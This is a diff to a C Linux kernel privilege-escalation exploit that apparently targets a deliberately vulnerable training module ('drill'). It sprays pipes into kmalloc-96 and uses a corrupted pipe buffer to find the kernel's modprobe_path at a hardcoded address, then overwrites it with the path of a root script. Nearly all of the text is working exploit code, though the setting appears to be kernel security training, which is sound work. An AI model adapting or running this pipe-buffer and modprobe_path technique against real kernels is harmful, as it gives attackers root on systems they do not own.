@@ -60,9 +60,6 @@
  */
 #define PIPES_N			(KMALLOC96_HOLES_N + OBJS_PER_SLAB * 2)
 
-#define PB_PER_SLAB_SLOT	2
-#define PIPE_CAPACITY		PAGE_SIZE * PB_PER_SLAB_SLOT
-
 /* The following formula is valid only when KASLR is disabled */
 #define MODPROBE_PATH_VADDR	0xffffffff82d486a0UL
 #define KERNEL_TEXT_VADDR	0xffffffff81000000UL
@@ -244,26 +241,22 @@ int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 	return EXIT_SUCCESS;
 }
 
-int search_and_overwrite_modprobe(int pipe_fds[PIPES_N][2], char *pipe_data,
-				  const char *modprobe_path, const char *privesc_script_path,
-				  int victim_pipe)
+int find_and_change_modprobe_path(char *pipe_data, char *modprobe_path,
+				  char *privesc_script_path)
 {
-	size_t modprobe_len = strlen(modprobe_path);
-	size_t script_len = strlen(privesc_script_path);
+	size_t modprobe_path_len = strlen(modprobe_path);
+	unsigned long modprobe_path_start = MODPROBE_PATH_VADDR & (PAGE_SIZE - 1);
+	size_t privesc_script_path_len = strlen(privesc_script_path);
+	int ret = -1;
 
-	for (int j = 0; j <= (PIPE_CAPACITY - modprobe_len); j += 8) {
-		if (memcmp(pipe_data + j, modprobe_path, modprobe_len) == 0) {
-			printf("[+] located \"%s\" at offset 0x%lx of pipe #%d\n", modprobe_path,
-			       (unsigned long)j, victim_pipe);
-			memcpy(pipe_data + j, privesc_script_path, script_len);
-			if (write(pipe_fds[victim_pipe][1], pipe_data, PIPE_CAPACITY) < 0) {
-				perror("[-] write");
-				exit(EXIT_FAILURE);
-			}
-			return EXIT_SUCCESS;
-		}
-	}
-	return EXIT_FAILURE;
+	assert(modprobe_path_start + modprobe_path_len < PAGE_SIZE);
+	ret = strncmp(pipe_data + modprobe_path_start, modprobe_path, modprobe_path_len);
+	if (ret != 0)
+		return EXIT_FAILURE;
+
+	assert(modprobe_path_start + privesc_script_path_len < PAGE_SIZE);
+	strncpy(pipe_data + modprobe_path_start, privesc_script_path, privesc_script_path_len);
+	return EXIT_SUCCESS;
 }
 
 /* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
@@ -292,11 +285,12 @@ int main(void)
 	int act_fd = -1;
 	long i = 0;
 	int pipe_fds[PIPES_N][2];
-	char pipe_data[PIPE_CAPACITY];
+	char *pipe_data = NULL;
+	ssize_t bytes = -1;
 	char act_args[DRILL_ACT_SIZE] = { 0 };
-	int success = 0;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
+
 	ret = increase_fd_limit();
 	if (ret == EXIT_FAILURE)
 		goto end;
@@ -325,7 +319,12 @@ int main(void)
 		pipe_fds[i][1] = -1;
 	}
 
-	memset(pipe_data, 0, sizeof(pipe_data));
+	pipe_data = malloc(PAGE_SIZE);
+	if (pipe_data == NULL) {
+		perror("[-] malloc");
+		goto end;
+	}
+	memset(pipe_data, 0, PAGE_SIZE);
 
 	for (i = 0; i < PIPES_N; i++) {
 		ret = pipe(pipe_fds[i]);
@@ -342,14 +341,16 @@ int main(void)
 		 * We should resize the pipe capacity right now to avoid hitting
 		 * the limit in /proc/sys/fs/pipe-user-pages-soft.
 		 */
-		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
-		if (ret != PIPE_CAPACITY) {
+		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * 2);
+		if (ret != PAGE_SIZE * 2) {
 			perror("[-] fcntl");
 			goto end;
 		}
 
-		if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
-			perror("[-] write");
+		/* Fill one page in this pipe */
+		bytes = write(pipe_fds[i][1], pipe_data, PAGE_SIZE);
+		if (bytes != PAGE_SIZE) {
+			printf("[-] write to pipe returned %zd\n", bytes);
 			goto end;
 		}
 
@@ -381,40 +382,44 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	printf("[*] trying to leak modprobe_path...\n");
+	printf("[*] searching the corrupted pipe containing modprobe_path...\n");
 	for (i = 0; i < PIPES_N; i++) {
-		ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
-		if (ret < 0) {
-			perror("[-] read");
+		/*
+		 * Read the whole page to make the kernel discard the first pipe_buffer
+		 * and save its page pointer into the pipe_inode_info.tmp_page array.
+		 */
+		bytes = read(pipe_fds[i][0], pipe_data, PAGE_SIZE);
+		if (bytes != PAGE_SIZE) {
+			printf("[-] read from pipe returned %zd\n", bytes);
 			goto end;
 		}
-		ret = search_and_overwrite_modprobe(pipe_fds, pipe_data, modprobe_path,
-						    privesc_script_path, i);
-		if (ret == EXIT_SUCCESS) {
-			success = 1;
-			break;
-		} else {
-			/*
-			 * If we scan current pipe and it is not corrupted,
-			 * we will write back exactly the same data we read.
-			 * It helps to read pipes many times properly.
-			 */
-			if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
-				perror("[-] write");
-				goto end;
-			}
-		}
-	}
 
-	if (!success) {
-		printf("[-] unable to leak modprobe_path\n");
-		goto end;
+		ret = find_and_change_modprobe_path(pipe_data, modprobe_path, privesc_script_path);
+		if (ret == EXIT_FAILURE)
+			continue;
+
+		printf("[+] modprobe_path %s is found in the pipe %ld\n", modprobe_path, i);
+
+		/* Write the page with modified modprobe_path back to the pipe */
+		bytes = write(pipe_fds[i][1], pipe_data, PAGE_SIZE);
+		if (bytes != PAGE_SIZE) {
+			printf("[-] write to pipe returned %zd\n", bytes);
+			goto end;
+		}
+
+		printf("[+] wrote the page containing new modprobe_path %s back to the pipe %ld\n",
+				privesc_script_path, i);
+		break;
 	}
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
-	if (ret == EXIT_FAILURE || strcmp(modprobe_path, privesc_script_path) != 0) {
-		printf("[-] modprobe_path (%s) differs from privesc script (%s)\n", modprobe_path,
-		       privesc_script_path);
+	if (ret == EXIT_FAILURE)
+		goto end;
+
+	ret = strncmp(modprobe_path, privesc_script_path, KMOD_PATH_LEN);
+	if (ret != 0) {
+		printf("[-] new modprobe_path %s is not privesc_script_path %s\n",
+				modprobe_path, privesc_script_path);
 		goto end;
 	}
 
@@ -428,6 +433,9 @@ end:
 		if (ret != 0)
 			perror("[-] close act_fd");
 	}
+
+	if (pipe_data)
+		free(pipe_data);
 
 	for (i = 0; i < PIPES_N; i++) {
 		if (pipe_fds[i][0] >= 0) {
